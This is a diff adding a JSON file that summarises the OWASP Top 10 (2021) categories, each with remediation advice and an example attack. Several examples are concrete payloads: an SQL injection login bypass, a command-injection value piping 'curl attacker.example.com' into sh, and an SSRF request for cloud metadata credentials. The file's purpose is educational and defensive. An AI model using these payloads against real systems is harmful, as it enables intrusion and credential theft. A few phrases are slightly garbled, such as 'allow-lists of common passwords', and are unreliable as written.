@@ -1,0 +1,95 @@
+{
+  "source": "owasp",
+  "docs": [
+    {
+      "source_id": "owasp-a01",
+      "title": "A01:2021 - Broken Access Control",
+      "text": "Access control enforces that users may only act on the resources and actions their permissions allow. Failures let attackers view or edit records belonging to others, escalate privileges, or invoke administrative functions. This class topped the 2021 OWASP ranking by prevalence.",
+      "sections": [
+        {"heading": "Remediation", "text": "Deny by default; implement server-side checks on every request; reuse mapped and deny object-level authorization (IDOR guards); disable directory listing; log access-control failures; rate-limit and cap APIs by role."},
+        {"heading": "Example attack", "text": "Changing /api/orders/1042 to /api/orders/1043 to read another customer's order, or adding is_admin=true to a profile update body."}
+      ]
+    },
+    {
+      "source_id": "owasp-a02",
+      "title": "A02:2021 - Cryptographic Failures",
+      "text": "Weak, misconfigured, or missing cryptography exposes sensitive data such as passwords, payment details, and personal information. Common causes include transmitting data over plaintext HTTP, storing passwords with fast hashes, and using deprecated algorithms.",
+      "sections": [
+        {"heading": "Remediation", "text": "Classify data and encrypt accordingly; enforce TLS 1.2+ with HSTS; store passwords with bcrypt, scrypt, Argon2id, or PBKDF2 with a strong work factor; use modern AEAD ciphers (AES-GCM, ChaCha20-Poly1305) and manage keys in a KMS."},
+        {"heading": "Example attack", "text": "Sniffing an unencrypted Wi-Fi network to capture a session cookie sent over HTTP, or cracking a database of SHA-1 password hashes with a rainbow table."}
+      ]
+    },
+    {
+      "source_id": "owasp-a03",
+      "title": "A03:2021 - Injection",
+      "text": "Untrusted data interpreted as code or commands by an interpreter lets attackers run SQL, OS commands, LDAP queries, or template expressions with the application's privileges. Injection flaws include SQL injection, OS command injection, and cross-site scripting.",
+      "sections": [
+        {"heading": "Remediation", "text": "Use safe APIs and parameterized queries instead of interpreters; validate input against strict allow-lists; escape output for the target context (HTML, JS, URL); apply least privilege to database and OS accounts."},
+        {"heading": "Example attack", "text": "Submitting OR '1'='1 in a login form username field to bypass authentication, or ; curl attacker.example.com | sh appended to a ping diagnostic parameter."}
+      ]
+    },
+    {
+      "source_id": "owasp-a04",
+      "title": "A04:2021 - Insecure Design",
+      "text": "Flaws built into the architecture itself, distinct from implementation bugs: missing rate limits, trust of client-side controls, and absent threat modeling. Secure design requires explicit security requirements and defense-in-depth at every layer.",
+      "sections": [
+        {"heading": "Remediation", "text": "Adopt secure design patterns and threat modeling; isolate tenants; separate trust levels; enforce business-logic limits such as maximum withdrawals and pick-up frequencies; design controls to fail safely."},
+        {"heading": "Example attack", "text": "A password-reset flow that allows unlimited reset codes per account, letting an attacker brute-force the six-digit token without any rate limit."}
+      ]
+    },
+    {
+      "source_id": "owasp-a05",
+      "title": "A05:2021 - Security Misconfiguration",
+      "text": "Insecure defaults, verbose errors, missing hardening, and unused pages or features widen the attack surface. Examples include default credentials, directory listing, open cloud storage buckets, and permissive CORS.",
+      "sections": [
+        {"heading": "Remediation", "text": "Implement a repeatable hardening process; remove unused features, frameworks, and sample apps; disable debug and stack traces in production; review and lock down CORS, headers, and cloud permissions."},
+        {"heading": "Example attack", "text": "Finding an S3 bucket with public write enabled via a leaked bucket name, then overwriting index.html with a phishing page."}
+      ]
+    },
+    {
+      "source_id": "owasp-a06",
+      "title": "A06:2021 - Vulnerable and Outdated Components",
+      "text": "Shipping components with known CVEs or unsupported versions hands attackers ready-made exploits. Risk grows when you do not inventory components, scan dependencies, or monitor security disclosures for the stack you run.",
+      "sections": [
+        {"heading": "Remediation", "text": "Maintain a software bill of materials; remove unused dependencies; monitor sources like NVD and GitHub Advisories; rebuild and redeploy to patched versions promptly; prefer maintained frameworks."},
+        {"heading": "Example attack", "text": "Exploiting a published Struts 2 deserialization CVE (Equifax breach class) against an internet-facing app that never upgraded its framework version."}
+      ]
+    },
+    {
+      "source_id": "owasp-a07",
+      "title": "A07:2021 - Identification and Authentication Failures",
+      "text": "Weaknesses in login, session, and credential recovery allow attackers to assume legitimate identities: credential stuffing, weak password policies, exposed session identifiers, and missing multi-factor authentication.",
+      "sections": [
+        {"heading": "Remediation", "text": "Enforce MFA for privileged and high-risk access; use allow-lists of common passwords; implement login throttling and credential-stuffing defenses; generate session IDs with a secure random source and invalidate them at logout."},
+        {"heading": "Example attack", "text": "Running credential-stuffing lists from prior breaches against /api/login with no rate limiting, then reusing a session cookie that never expires."}
+      ]
+    },
+    {
+      "source_id": "owasp-a08",
+      "title": "A08:2021 - Software and Data Integrity Failures",
+      "text": "Code and infrastructure that update without integrity verification, insecure CI/CD, and unsafe deserialization let attackers substitute malicious artifacts. Trust in plugins, libraries, and auto-updates must be verified cryptographically.",
+      "sections": [
+        {"heading": "Remediation", "text": "Use digital signatures to verify software and data integrity; prevent insecure deserialization of untrusted data; review CI/CD pipelines for segregation and secrets; ensure libraries come from trusted sources."},
+        {"heading": "Example attack", "text": "Poisoning a dependency's minor version with a post-install script that exfiltrates environment variables, or tampering with a serialized JWT session blob containing is_admin."}
+      ]
+    },
+    {
+      "source_id": "owasp-a09",
+      "title": "A09:2021 - Security Logging and Monitoring Failures",
+      "text": "Without effective logging, detection, and response, breaches go unnoticed and attackers face no friction. Common gaps: no audit trails for privilege changes and logins, alerts that nobody watches, and logs that omit context.",
+      "sections": [
+        {"heading": "Remediation", "text": "Log auditable events (logins, privilege changes, high-value transactions) with enough context; centralize logs and protect them from tampering; define alert thresholds and an incident-response runbook; practice detection with breach simulations."},
+        {"heading": "Example attack", "text": "An attacker explores an admin API for weeks, deleting logs on each host after use, with no centralized log store to catch the pattern."}
+      ]
+    },
+    {
+      "source_id": "owasp-a10",
+      "title": "A10:2021 - Server-Side Request Forgery",
+      "text": "Applications fetching attacker-supplied URLs without validation expose internal services, cloud metadata endpoints, and private networks to the attacker's chosen requests. The attack surface grows as more services connect over HTTP.",
+      "sections": [
+        {"heading": "Remediation", "text": "Segment outbound network access; enforce allow-lists for destinations; validate and normalize URLs; block private, loopback, and link-local IP ranges after DNS resolution; disable automatic redirect following."},
+        {"heading": "Example attack", "text": "Requesting http://169.254.169.254/latest/meta-data/iam/ through a webhook URL field to steal cloud instance credentials."}
+      ]
+    }
+  ]
+}
